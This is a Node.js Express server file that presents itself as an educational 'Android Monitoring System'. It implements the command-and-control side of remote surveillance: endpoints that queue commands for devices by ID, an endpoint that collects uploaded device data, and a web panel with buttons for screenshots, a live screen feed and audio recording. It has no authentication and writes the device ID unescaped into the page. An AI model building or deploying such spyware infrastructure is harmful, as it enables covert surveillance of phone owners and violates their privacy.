// server.js - Node.js Backend for Android Monitoring System (Educational Use Only)
require('dotenv').config(); // For environment variables
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

// ======================
// Middleware Setup
// ======================
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ======================
// Data Storage (In-memory)
// ======================
const deviceData = new Map(); // Stores data per device

// ======================
// API Endpoints
// ======================

// Health Check
app.get('/', (req, res) => {
  res.status(200).json({ status: 'active', timestamp: new Date() });
});

// Command Handling
app.post('/command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  deviceData.set(deviceId, { ...deviceData.get(deviceId), lastCommand: req.body.command });
  res.status(200).json({ status: 'command_received' });
});

// Data Upload Endpoint
app.post('/data/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const existing = deviceData.get(deviceId) || {};
  deviceData.set(deviceId, { ...existing, ...req.body.data });
  res.status(200).json({ status: 'data_received' });
});

// ======================
// Admin Control Panel
// ======================
app.get('/panel/:deviceId', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Device Control Panel</title>
      <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .control-panel { max-width: 600px; margin: 0 auto; }
        button { 
          padding: 10px 15px; 
          margin: 5px; 
          background: #4CAF50; 
          color: white; 
          border: none; 
          border-radius: 4px; 
          cursor: pointer;
        }
      </style>
    </head>
    <body>
      <div class="control-panel">
        <h1>Device Control: ${req.params.deviceId}</h1>
        
        <div class="control-group">
          <h3>Screen Capture</h3>
          <button onclick="sendCommand('capture_screen')">📸 Take Screenshot</button>
          <button onclick="sendCommand('start_live_screen')">▶️ Start Live Screen</button>
        </div>
        
        <div class="control-group">
          <h3>Audio Controls</h3>
          <button onclick="sendCommand('start_recording')">🎤 Record Audio</button>
          <button onclick="sendCommand('record_10s')">⏺️ Record 10s</button>
        </div>
        
        <div id="status" style="margin-top: 20px;"></div>
      </div>
      
      <script>
        function sendCommand(cmd) {
          document.getElementById('status').innerText = "Sending command...";
          fetch('/command/${req.params.deviceId}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
          })
          .then(() => document.getElementById('status').innerText = "Command sent successfully!")
          .catch(err => document.getElementById('status').innerText = "Error: " + err);
        }
      </script>
    </body>
    </html>
  `);
});

// ======================
// Server Initialization
// ======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Control panel available at /panel/:deviceId`);
  console.log(`API endpoints:
    - POST /command/:deviceId
    - POST /data/:deviceId`);
});
